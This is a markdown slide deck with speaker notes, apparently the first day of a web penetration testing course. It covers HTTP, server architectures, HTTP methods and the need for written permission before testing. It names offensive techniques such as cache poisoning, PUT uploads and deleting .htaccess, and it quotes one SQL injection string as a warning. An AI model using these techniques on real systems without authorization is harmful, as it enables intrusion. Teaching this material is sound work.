---?image=assets/pp-paint-bar.jpg

@title[Day 1 Attackers View of the Web]

#### Web Penetration Testing and Ethical Hacking  
## Attacker's View of the Web


###### Professionally Evil<br>Web Application<br>Penetration Testing<br>101.1

Copyright 2014, Secure Ideas  
Version 1Q14

Note:
Web applications are a major point of vulnerability in organizations today. Web app holes have resulted in the theft of millions of credit cards, major financial and reputational damage for hundreds of enterprises, and even the compromise of thousands of browsing machines that visited web sites altered by attackers. 

In the next few days, you'll learn the art of exploiting web applications, so you can find flaws in your enterprise's web apps before the bad guys do. Through detailed, hands-on exercises and these materials, you will be taught the four-step process for web application penetration testing. You will inject SQL into back-end databases, learning how attackers exfiltrate sensitive data. You will utilize Cross Site Scripting attacks to dominate a target infrastructure in our unique hands-on laboratory environment. And, you will explore various other web app vulnerabilities in-depth, with tried-and-true techniques for finding them using a structured testing regimen. As well as the vulnerabilities, you will learn the tools and methods of the attacker, so that you can be a powerful defender.

---

# Lab Set Up

- You will receive 2 DVDs
	- They contain two zip files and a readme
- Extract both zip files
	- One from each DVD
- Launch them by double-clicking the .vmx file
- VMware will ask if VM was moved
	- Select "I Moved It"
- **Both images need to be running during ALL exercises!**

Note:
You will receive two DVDs.  (Unless they were shipped with your books)  On disk one, there is a README.txt file and a zip that contains the target VM.  Extract this file to a location on your hard drive.  On disk two is the samuraiWTF zip file.  Extract this one to another place on your hard drive.  We recommend that you place both into directories under a PEWAPT101 directory to keep them together.

Run both virtual machines by clicking on their respective .vmx files. If the VM was moved or copied, select “I moved it” when VMware prompts you.

Make sure that both VMs are running during every exercise.

**Unless instructed otherwise, do ALL exercises in the SamuraiWTF VM.**

+++

<!--TODO Draw box/Emphasise 'I moved it' button-->
![VMware prompt asking whether VM is copied or moved. Select 'I moved it'.](assets/day1/001/vm-moved.png)

---

# Course Outline

- ***Day 1: Attacker's View, Pen-Testing and Scoping***
- Day 2: Recon & Mapping
- Day 3: Server-Side Vulnerability Discovery
- Day 4: Client-Side Vulnerability Discovery
- Day 5: Exploitation
- Day 6: Capture the Flag

Note:
In this class, we will learn the practical art of web application penetration testing. 

On Day 1, we will examine the attacker's perspective, and learn why it is important for us to build and deploy web application with the attacker's perspective in mind. We will also cover the pieces of a penetration test and how to scope and prepare for one.  Finally, we will explore the methodology that will be covered through the rest of class.
 
During Day 2, we will step through the process that successful attackers use to exploit applications, focusing specifically on the reconnaissance and mapping stages of the process.  This will give us the foundation we need to later control the application.

On Day 3, we will build upon that foundation and start discovering the various weaknesses within the applications.  As penetration testers, we will map out the attack vectors that we are going to use against this application. These discoveries will be the basis for the exploitation phase.

On Day 4, we will continue our discovery focusing on client side components such as Flash and Java.  We will also explore the client-side scripting in use within our applications.

On Day 5, we will launch the attacks that we planned and created during the previous three sections. We will also cover the next steps for students and where they should go from here.

On Day 6, we will be performing a web application pen-test within a capture the flag event.

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- ***Why the Web?***
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
Today we will review web applications from the attacker's perspective, and explore the backdoors and vulnerabilities that they have been leveraging to take control of our web applications. 

Nothing drives home the risk to organizations like demonstrating an attack first-hand... except perhaps evil people demonstrating the same thing.  This course will show you how, as a penetration tester, you can execute attacks to reveal specific weaknesses in applications.

You will already be familiar with many of the topics that we cover, but now we are going to show them to you in a new, twisted light.

We will cover quite a few topics today.  First, we will have an overview of the web and the attacker's perspective.  Second, we will examine web servers and clients from an attacker's point of view.  Next, we will cover application servers and the HTTP protocol, and then we will outline a web application penetration testing methodology. We will then focus on JavaScript and PHP from the perspective of a penetration tester.

---

# Why the Web?

- More and more of our daily lives make use of web applications
- Originally the web was static brochures
- Many of today's websites have grown significantly more complex
	- Critical business functionality available to employees and possibly even the public across the Internet via portals
	- Fully functional office suites are being offered via your web browser
	- Web-based administration of critical business applications and even security infrastructures
- There is now a much larger attack surface
	- More complexity for attackers to manipulate
	- Bigger pay-off for bad guys looking to commit fraud, make money, or cause mayhem

Note:
Why are web applications such a popular target for attackers? First, because of their widespread use. Years ago, use of the Internet was largely confined to academic and research environment. Now thanks to the World Wide Web (WWW), it is integrated into the daily lives of most people and organizations.  One great benefit of web applications is that they are extremely portable and typically function well on a range of client operating systems in default configuration.  They are also easier to create than desktop applications.  (This explains the move toward rich Internet applications.)

Web applications are often used to store, manage and access sensitive financial and personal information. Consumers use them for accessing bank accounts and managing credit cards; companies use them for sharing intellectual property; hospitals use them for providing patients with access to their medical records. The high value of the data accessed via web applications increases their value as a target.

Initially, the web consisted of static, non-interactive pages. Today, web applications are interactive and used for a vast array of purposes, including file sharing and office suites. This has opened the door for many creative exploits, including SQL injection and Cross Site Scripting. 

---

# Current Web App Security Testing is Often Limited

Many enterprises test only the business functionality of applications deployed to the web

- Rarely is security tested
- This becomes obvious when you examine the daily reports on vulnerability mailing lists
- The Open Source Vulnerability Database (www.osvdb.org) includes a large number of vulnerabilities
	- The majority of new reports focus on web applications
- The XSS Information and Archive (http://xssed.com/) also lists sites found to be vulnerable to web flaws

Note:
Unfortunately, the rush to add features and improve web application capability has led organizations to focus on _business functionality testing,_ not _security testing._  Even when security is tested, it’s often an afterthought.

If you look at the Open Source Vulnerability Database (http://www.osvdb.org) you will see that the highest number of reported vulnerabilities are web application related.  New web application vulnerabilities are being found and discussed every day on mailing lists such as Full Disclosure and Bugtraq.

You can also check out XSSed.com to find announcements are public web sites being found vulnerable to various web flaws.  It is pretty surprising  how often web sites find out they are vulnerable due to announcements like the ones on this site and others.

---

# Increased Functionality with Web 2.0

- Web sites are doing more without us knowing it
	- HTTP requests made without user interaction
	- Mash-ups combine various applications
- AJAX and other technologies allow sites to make requests for us
- We are training our users to expect this type of behavior from web clients

Note:
Asynchronous JavaScript and XML (AJAX) is a popular way to make web pages more interactive.  Typical web sites require the user to click a link or image, the request goes to the server and then the entire web pages redraws with the result.  With AJAX, as the user interacts with the site, JavaScript code is executed to make calls and retrieve data from the server.  The page is then dynamically updated as data is received.  Google Maps is an excellent example of this technology.  Metasploit (a very handy framework for exploitation) also includes AJAX in its web interface, so even the attack tools are using it.

+++

<!-- Consider converting to .svg image?
  -- Add inline image instead of featuring as separate slide? -->
![](assets/day1/006/web-2-0-various-content-providers.png)

---

# Cloud-based Applications

- Cloud computing has exploded
	> On demand resources are becoming more common
- Testing of these applications are no different
	> They tend to focus on functionality
- Liability or restrictions stop many security testing processes
	> Are we allowed to?
- Vendors hesitate to allow testing
	> Or so it's assumed

<!--TODO Insert cloud stock image to the right
(Provided image not used due to unknown usage rights) -->

Note:
In recent years cloud computing has become a major move in technology.  Many organizations are either running web applications in the cloud or evaluating such a move.  While these applications expose the same types of risks and flaws as non-cloud based applications, just like traditional apps, testing is limited to functionality.  As a matter of fact, many organizations that have robust security testing procedures don't perform security testing on cloud based applications.  This is because of worries regarding liabilities or restrictions.  Many people even believe that cloud vendors won't allow testing of their infrastructure.  In most cases though, this is an incorrect belief.  Cloud vendors do allow application-level testing in many instances, ask your target.

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- ***Web App Pen Testing***
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
What do we need to start testing our applications before the bad guys test them for us?

First, we need to understand how the web works.  Then we need an attack methodology and the tools to execute it.  Most importantly, we need permission to test web applications for vulnerabilities in a specific environment.  Make sure that you receive permission, in writing, from someone who has the authority to give it.

---

# Understanding the Web

- To conduct successful web application penetration tests, we need a deeper understanding of web technologies
- Pen testers have a different viewpoint from normal users
	- Must think maliciously, but act professionally
	- How can I bypass restrictions?
	- What mistakes did the developers, admins, and operators of the target system make?
- This is often a different mindset from the developers and admins themselves!
	- Focus on bypassing application controls
	- Find business logic problems
- It is one of the focuses for today

Note:
In order to exploit web applications, we need to have a deep understanding of how the web works-- and how it doesn't work.  This understanding must be deeper than the average user's level of knowledge, and even developers and web administrators.  

After today, you will look at the web differently. We are going to review the technical underpinnings of the web and discuss security strengths and weaknesses. I have always described this as using our peripheral vision when looking at sites.

---

# Characteristics of a Solid Web App Pen Test Methodology

- Since a scattershot approach fails!
- Our methodology must be:
	- Proven: Track Record
	- Repeatable: Developers (and other testers) can reproduce our results
	- Explainable: We must express discovered problems and fixes in an understandable manner
- This is another focus for today

Note:
Successful web penetration testers follow a proven methodology.  Without it, you will miss vulnerabilities and not complete the job.  The methodology that we are going to cover today and the rest of this week is designed specifically to fulfill the needs of penetration testers. It is:

Proven – This methodology has been used for years by penetration testers.  These testers have shown that by following this methodology, they have been able to find and exploit problems with websites around the globe.

Repeatable – One of the biggest problems with security testing is the issue of false positives.  Finding something and labeling it vulnerable when it really wasn't.  This is fixed by having a repeatable test.  If a finding is doubted or you just want to show it to management, having a repeatable test is critical.

Explainable – I think that everyone has worked with that expert that can find the issue and fix it, but can't seem to explain how he found it.  If we are going to be able to grow the field and continue helping secure our environment into the future, we need to be able to teach and explain what we do.  This methodology fulfills that need.

---

# Knowledge of Tools

- Understand what tools are available and how it integrates into a full testing regimen
- Gain in-depth knowledge in the use of each tool
	- Know their strengths and weaknesses
	- Understand common pitfalls and tactics for avoiding them
	- Determine how knowledge gleaned from one tool can be fed into another in an integrated test
- How to expand or improve tools
	- At a minimum, developing scripts for automation
	- Developing patches to improve existing tools
	- Identifying gaps and creating new tools – There is still plenty of room for innovation in web app testing tools

<!--TODO Insert tool logos to the right -->

Note:
Knowledge of tools is fundamental.  You do not need to memorize command line options or parameters to every tool around; that is why we have man pages and help screens.  You simply need to be familiar with the penetration testing tools that exist, and understand their capabilities so that you can leverage them appropriately. This class does not attempt to show you every tool or option, but we do expose you to a wide variety of tools and explain how they can be used together to uncover issues.

Another thing that we would like to impress upon you is that everyone can help by making the tools we use better.  This may be by developing patches or writing your own and releasing it.  Or even just submitting bug reports and forum postings helping others use the tools. The tools that you use are complex, and have been developed and improved by many people, and we encourage you to contribute. We are only as good as we make ourselves.  

---

# Permission to Test

Getting permission from target system personnel is absolutely vital
> You don't want to end up with a lawsuit, or, worse yet, facing a prison sentence! 
Get a permission memo signed by someone in authority
> Sample memo at  
  www.counterhack.net/permission_memo.html
The permission must be in writing, and it must be signed!
> Don't rely on mere verbal assent or a simple e-mail … you are asking for trouble

<!--TODO Insert image: Monopoly Get Out of Jail Free card -->

Note:
Get permission, in writing, from someone with authority.

This is probably the most critical piece of information in the entire class, at least as it relates to your continued employment and freedom.  There are many laws around hacking and many people monitoring their systems.  If you do not get permission to test the security of an application, in writing, from someone with the authority to give you permission, then do not test that application.  

This includes "I accidentally discovered a SQL injection flaw in my bank's web site!"  No one accidentally types in ' OR 1=1; -- into the money transfer fields of their online bank (especially not educated security professionals). 

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- ***Web Site Server Architecture***
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
When planning an attack, it is helpful to understand the server architecture used by a specific application. Depending on the architecture, specific types of vulnerabilities may be present. The next section will cover the various web server architectures and how the attacker views them.

---

# Web Site Server Architecture Types

- Generally, web sites follow one or more of four different architecture types
	- Web Servers
	- Dynamic Servers
	- Application Servers
	- Proxy Servers
- As testers, we need to determine what type of web site server architecture we face
	- Target system personnel may tell us in a “white-box” test
	- In a “black-box” test, we need to discern this based on clues
		- Clues such as server responses and cookies
- We'll discuss client architectures later in the course

Note:
Typically, there are four different architectures that web sites follow.  Understanding which architecture is in use helps the attacker plan successful attacks, both against the application and the network after gaining a foothold within the application.

Penetration testers need to figure out the type of architecture in use very early in the test.  During white box tests, the target system personnel would tell the testers.  But during grey or black box testing, the architecture needs to be determined. This is accomplished by examining the clues inserted into the responses from the application.

---

# Web Servers

- Pure web servers are rare today
- They serve static content only
- Very useful for information discovery
	- Sites on this server can be used to build wordlists
	- Sites may also contain information about the technology used
- Typically safe from most active web application attacks
	- Although misconfigurations of underlying web server, ancillary network services, and operating system could provide avenue for attack
- Most modern web servers fall under the dynamic category

Note:
Originally, web servers provided only static content. This is the simplest form of web server. Examples of this category include IIS with the ISAPI plugins disabled, or Apache with the modules disabled.  

As you can see, our model of a classic web server's communication is extremely simple. It falls under the client-server model. Beyond that, it is not terribly interesting to us or to attackers. Classic web servers are typically safe from most active attacks, because they do not provide opportunities for input. They are, of course, useful for information discovery.

Fortunately, modern web servers fall under the "dynamic" category, and are more interesting!

+++

<!-- Consider converting to .svg image?
  -- Add inline image instead of featuring as separate slide? -->
![](assets/day1/015/static-webserver-diagram.png)

---

# Dynamic Server Architecture

- Web Server that serves both static and active content
	- Most common server type found today
- Active content often drawn from a back-end data store
	- Commonly a relational database accessed using SQL
	- Other data stores are possible, such as mainframe, file server, or other application
- Very simple and inexpensive to set up
- More difficult to protect and harden
	- Code runs on same server as display

Note:
Today, most often when the term "web server" is used, the speaker is referring to the "dynamic" category.  This means that in addition to serving static pages, the web server also provides active content. Web servers that proxy requests for application servers fall into this category if they also manage the static content such as graphics or style sheets.

This is a typical setup for a dynamic  web server. The web server provides content to the web client, while also accessing and/or manipulating back-end data storage.

+++

<!-- Consider converting to .svg image?
  -- Add inline image instead of featuring as separate slide? -->
![](assets/day1/016/static-webserver.png)

---

<!-- Slide 18 -->
# Application Server Architecture

- Applications run within a server application
	- Example application servers include IBM WebSphere, BEA WebLogic, JBoss, and Lotus Domino
	- Application server is usually located behind a proxy server or front end web server with a plug-in
- Application servers rarely communicate directly with the client
- Application servers provide applications with self-contained features and additions

Note:
Application servers typically sit between a front-end web server (or proxy server) and a data store. The application server processes the application logic and either retrieves data from the data store or sends presentation to the front end servers. As shown in the diagram above, the web client connects to a web server or reverse proxy server.  This, in turn, connects to an application server that uses data from the data store to perform business actions.  The application server then returns the results to the client through the web server.

Some examples of application servers are IBM WebSphere, BEA WebLogic, JBoss, Lotus Domino.

+++

<!-- Consider converting to .svg image?
  -- Add inline image instead of featuring as separate slide? -->
![](assets/day1/017/application-server-diagram.png)

---

# Proxy Server Architecture

- A proxy server front ends for one or more applications
	- Sometimes called a “reverse proxy” to differentiate it from the proxies used by clients to access the Internet
- The proxy passes requests through to the application and caches the results
- Target for cache poisoning and information disclosure
- Both inbound and outbound proxies exist in server architectures
- Proxies provide content caching to applications

Note:
The general term "proxy server" refers to a server which receives client requests and forwards them to another server, and vice versa.  "Web proxies" are specifically designed to handle web traffic. They can be located at the client site, in which case they are often used to restrict and filter web content, or at the server site, in which case they are often used to sanitize user input before it is passed on to an application server. 

Web proxies often cache results in order to speed future requests.  If a caching proxy server is misconfigured, it can allow an attacker to bypass authentication or authorization controls.  This is similar to an issue you may have noticed in Google's search caching, where Google search appliances have the credentials to gather certain sites and then display the cached pages to anyone, even users who are not authorized to view them on the original server. 

If you're targeting an application, one thing to remember is that when you port scan an application behind a proxy server to determine OS and service types, the scan will return mixed results.  An example of this was results from such a scan reporting that Hotmail was running on IIS6 on top of a OpenBSD machines. 

You can also attack the proxy server. Since proxy servers sometimes act as front-ends for multiple applications, this can potentially allow you to exploit other applications, as well.  Furthermore, by poisoning the proxy cache, you can control what other users see.

+++

<!-- Consider converting to .svg image?
  -- Add inline image instead of featuring as separate slide? -->
![](assets/day1/018/proxy-server-diagram.png)

---

# Attacker's Perspective of Web Site Server Architecture

- Knowing the architecture makes attacking it easier
	- Many architectures add features which can be targeted
- First, consider what is the target?
	- Usually, the application and its data
	- And, those can be a vehicle for attacking the enterprise network behind the site
		- Allows pen tester to pivot through web application to gain access to critical intranet devices – verify that such attacks are allowed in scope
- The web site server architecture may also open attack vectors
	- Cache poisoning against proxies
	- Source code disclosure attacks against application servers
	- Command injection against hybrid servers

Note:
As an attacker, understanding the server architecture helps us gain more from each attack.  First, we need to clearly define our target. Then, we need to consider the placement of our target in relation to the web server architecture, and develop our goals. The architecture itself will open attack vectors.  

For example, if we are attacking an application to gain more information or access to its data, then knowing that an application server is in place guides our attack. If we are attacking the company behind the application, then sending attacks that cause the proxy server to cache incorrect results, potentially defacing the site, would be one potential goal.

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- ***The HTTP Protocol***
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
In this section, we will explore the HTTP protocol and its components.  This is not simply a review, but an exploration of these topics, in which we will examine how an attacker uses the protocol and to further his or her goals.

---

# HTTP Protocol

- Hypertext Transfer Protocol (HTTP)
- It is a request/response protocol using a reliable transport
	- Typically TCP
- HTTP/1.1 is defined in RFC 2616
	- 1.1 changes many things from 1.0
		- Better caching support
		- Designed to be extended as needs change
		- Bandwidth optimization changes
	- Host: header field is important to security testing
		- Scripted and manual requests require it
- HTTP 2.0 is currently being drafted
	- Proposed as a binary protocol

Note:
Let's examine the Hypertext Transfer Protocol (HTTP), which forms the basis for information transfer on the web. 

HTTP is a request-response protocol, in which a *user agent *(the client) makes a request to the origin server, which responds. It was originally designed by Tim Berners-Lee at CERN, in order to share documents and files among researchers. Since then, it has been improved, extended and standardized by the World Wide Web Consortium (W3C) and the IETF.

HTTP is an unreliable protocol, which means that in order to work effectively, in needs to run on top of a reliable transport protocol such as TCP. 

The HTTP/1.1 protocol is defined in RFC 2616:  
http://tools.ietf.org/html/rfc2616

You can also read about the original HTTP design considerations:  
http://www.w3.org/Protocols/DesignIssues.html

If you are interested in the HTTP 2.0 spec, check it out at http://tools.ietf.org/html/draft-ietf-httpbis-http2-04   It is currently being worked on.  One interesting thing that will drastically change our testing is the binary nature being set up.

---

# Example HTTP Request

<!-- Consider converting to .svg image? -->
![](assets/day1/022/example-http-request.png)

Note:
As shown in the slide above, the web client will send a request for a specific resource.  The GET method is used in the example.  The client will also specify which version of the HTTP protocol that it is using.  The User-Agent and the Host name required are also sent.  Finally, any cookies already set and the content length are specified.

As you can see on the slide, the request contains a number of header fields.  Most of these fields are optional and added by the client or the application.

The request is where the client is requesting the resource.  Later we will discuss the various methods.

The user agent string is an identifier that the client sets.  The server can use this information to change its logic.

Any cookies set by this application are part of each request after they have been established.

---

# User-Agent

- Web clients are considered the User-Agent
	- Usually a browser, but not always!
- Typically identified in an HTTP header field
- Consider:  
`User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727) Paros/3.2.13`
	- Mozilla/4.0: This signifies that the browser is compliant with the standards set by Netscape
	- MSIE 7.0: Internet Explorer 7.0 is the software type
	- Windows NT 5.1: This browser is running on Windows XP
		- NT 6.0 is Vista/2008, 5.2 is XP 64-bit/2003, 5.1 is XP, 5.01 is Win2K SP1, 5.0 is Win2K
	- .NET CLR 1.1… and 2.0…  These two versions of the .NET client are supported
	- Paros: This string was added by the Paros interception proxy
- Any of these items can be spoofed, set to any value an attacker or pen tester desires

Note:
The web client is referred to in the HTTP RFC as the "user agent." During an HTTP request, the web client sends information about itself in a string with the prefix "User-Agent." This information typically identifies the client browser, host operating system and language (although not in a standardized manner). This allows the web server to respond with pages formatted for the web client's system.

Although the user-agent string is typically set correctly by default, it can be modified or spoofed by the end user. This can allow the end user to retrieve content designed for other browser types, provide incorrect browser statistics to a server, or evade internal browser standardization controls. 

The various parts of the user-agent string identifies the various pieces of software that make up the browser platform.  Many different things can change this string including spyware or extensions that provide the ability to the user.

The Windows NT 5.1 is interesting as it signifies the XP version of Windows.

---

# Example HTTP Response

<!-- Consider converting to .svg image? -->
![](assets/day1/024/example-http-response.png)

Note:
The server then responds with the status code and message.  It will return a content type to tell the client what type of data to expect and a content length.  The server will also send a date header and optionally a header named Server, which may disclose information regarding server type and installed modules.

The status code is a code that tells the resulting status of the request.  200 is a success message.

The Server: field is interesting as it can display a significant amount of information regarding the server configuration.  The example in this slide is "Apache/2.2.3 (Red Hat)" which is shows both the version of Apache and the Linux distribution in use.

The Date field is interesting to an attacker as it reveals the time the server thinks it is.  We will use this field later as one way to find load balanced servers.

---

# Uniform Resource Identifier (URIs)

- A URI is the address of a resource including how to retrieve it
- The term Uniform Resource Locator (URL) is now used interchangeably by most people
- URI contains:
	- `protocol://[user:password@]host.domainname[:port]/resource?param=value`
- Consider:  `http://www.secureideas.com/index.php?id=42`
	- http is the protocol
	- www.secureideas.com is the host.domainname
	- index.php is the resource
	- id is a parameter
	- 42 is the value of id

Note:
The URI is made of various pieces. In order, these are as follows:
- The protocol. In this class, we will focus on HTTP and HTTPS (which is simply HTTP over SSL). 
- The username:password combination is used for authentication (Blocked within the address bar of IE).
- The host and domain name.  For example, www.secureideas.com.
- The port is defaulted to 80 for http and 443 for https, if not specified.
- The actual resource on that server.
- A question mark, which is followed by the various parameters needed by the resource. These parameters are listed in the format "parameter = value," and multiple parameters are divided by ampersands.

---

# Query String Formats

- Query strings are used to pass data via a URL request
- Popular target for attackers
	- Trivial to manipulate – they are in the browser's location line
	- We will analyze tools to manipulate them in a more flexible and automated fashion
- The format of query parameters is determined by the web application developer and/or the production environment running the application
- Typical format:
	- index.php?id=42&name=Kevin
- Other formats:
	- index.php/id/42/name/Kevin
		- Uses Apache's mod_rewrite module
	- index.php/id=42$name=Kevin
		- Data parsed by server side code
	- index.php?param=id:42&param=name:Kevin
		- Data used by an application executed using a system call in the web application

Note:
Typically a web application uses the ?param=value format for query parameters.  But due to either quirks in the application design or the usage of a module such as mod_rewrite, parameters can appear in many different formats.  While it would be impossible to explain every possible pattern, some of the typical ones are shown here on this slide.  As you map the application, these parameters become clearer.

The mod_rewrite example uses the Apache module that will rewrite a URL.  This is typically used to increase search engine rank since most search engines will not index parameters.

The next example will pass the entire string to the application logic for parsing, which, quite often, can be attacked using code injection.

The final example is an older one, but it is still seen often enough.  The web application will take the parameters and pass them to an application running on the server.  This typically uses a system call with in the web scripting language.

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- ***HTTP Methods***
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
Today we will review web applications from the attacker's perspective, and explore the backdoors and vulnerabilities that they have been leveraging to take control of our web applications. 

Nothing drives home the risk to organizations like demonstrating an attack first-hand... except perhaps evil people demonstrating the same thing.  This course will show you how, as a penetration tester, you can execute attacks to reveal specific weaknesses in applications.

You will already be familiar with many of the topics that we cover, but now we are going to show them to you in a new, twisted light.

We will cover quite a few topics today.  First, we will have an overview of the web and the attacker's perspective.  Second, we will examine web servers and clients from an attacker's point of view.  Next, we will cover application servers and the HTTP protocol, and then we will outline a web application penetration testing methodology. We will then focus on JavaScript and PHP from the perspective of a penetration tester.

---

# HTTP Request Methods

- Web clients can use various request types when accessing a web server
- These request types are referred to as “request methods”, and include:

```
- GET   	- OPTIONS
- POST  	- CONNECT
- HEAD  	- PUT
- TRACE 	- DELETE
```

<!--TODO Insert road with 'www' stock image to lower-right corner
(Provided image not used due to unknown usage rights) -->

Note:
Various methods are used when requesting resources on the web.  These methods are supported by most browsers.  Servers can be configured to accept the specific methods.  We will discuss these in further depth in the next few slides.

Some web applications and/or servers add other methods; technologies such as WebDAV also have other methods.  In class we will focus on the ones listed here.

---

# GET/POST/HEAD Methods

- GET requests a web page, passing any parameters via the URL
	- Allows for bookmarks to save parameters
		- Could be dangerous for authentication-related and session-tracking parameters
	- Easy manipulation by attackers and pen testers
- POST also requests a web page, but passes any parameters via the HTTP payload
	- Still able to be manipulated
	- Often can be changed to a GET for simpler scripting
		- If the application supports method interchange
		- Register_globals is one way this happens in PHP
- HEAD only returns the HTTP headers
	- Results of a request
	- Speeds up testing if the tester is interested in header data

Note:
"GET" and "POST" are the two most common HTTP methods used on the web.  Both request pages from the server.  The most obvious difference between the two is that GET uses the URL to pass parameters to the application and POST uses the HTTP payload.

GET is nice because the URL and results can be bookmarked.  It is also easier to script against an application that uses the GET method.

POST uses the payload, so it is a little more difficult to fiddle with the parameters.  But modern tools make this an almost trivial effort.  The other reason applications use POST is that the parameters will not get logged in a typical situation.  This will protect against critical pieces of information getting written to web server or proxy logs. 

HEAD is the method that instructs the server to only respond with the HTTP headers.  This allows an attacker to test requests without waiting for the payload.  Obviously, this requires the data the attacker is looking for to reside in the HTTP response headers.

---

# TRACE/OPTIONS Methods

- TRACE echoes the request as seen by the server back to the client
	- Allows the attacker to see any changes made by intermediate servers such as a proxy
	- Changes to the request may be made by inbound or outbound proxies
- OPTIONS asks the server which HTTP methods are supported
		- Easy method for determining which methods can be used for attacks

Note:
The OPTIONS method is used to query the server to find out what methods it supports.

TRACE will echo the request as the server saw it, back to the user.  This enables the user to see any pieces of information that are added by intermediaries like load balancers and proxy servers.

---

# CONNECT Method

- CONNECT creates an HTTP tunnel for requests
	- Used to connect through a proxy
	- Can be useful in attacking other resources behind a proxy server
	- Also used to establish SSL connections

Note:
The CONNECT method is used when accessing the application through a proxy server.  Your client connects to the proxy and issues a CONNECT method, which includes the name of the resource you wish to access on the back end system.

If you know the resource, there is the chance that you can abuse the proxy to give you access to applications you shouldn't be able to access.

+++

<!-- Consider converting to .svg image?
  -- Add inline image instead of featuring as separate slide? -->
![](assets/day1/031/connect-method-proxy-server.png)

---

# PUT/DELETE Methods

- PUT uploads data to the location specified by the URL
	- The data to upload is the HTTP payload
- DELETE removes the resource specified by the URL
	- Could lead to denial of service
	- Can also change configurations
		- Deleting a .htaccess file is an example
- Neither of these methods typically supported on public Internet-facing servers… we hope!

Note:
The two methods, "PUT" and "DELETE" are used for Web-based Distributed Authoring and Versioning (WebDAV), which generally should not be in use on public web servers.  They are much more common within intranet sites.  Keep in mind that WebDAV has many other methods, these are just the most common.

"PUT" is used to upload data to a server, while "DELETE" removes it.

As a tester, PUT will allow you to upload code that can then be called via the browser.  This would execute it on the server.

Most people will think of DELETE being a denial of service attack, such as deleting the content of the index page, preventing other users from seeing the site.  But let's think a little more evil. What would happen if you used DELETE to remove configuration files such as the .htaccess.  Since .htaccess is used to set configurations and access controls, the penetration tester could remove controls that blocked access to the application. 

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- ***HTTP Status Codes***
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
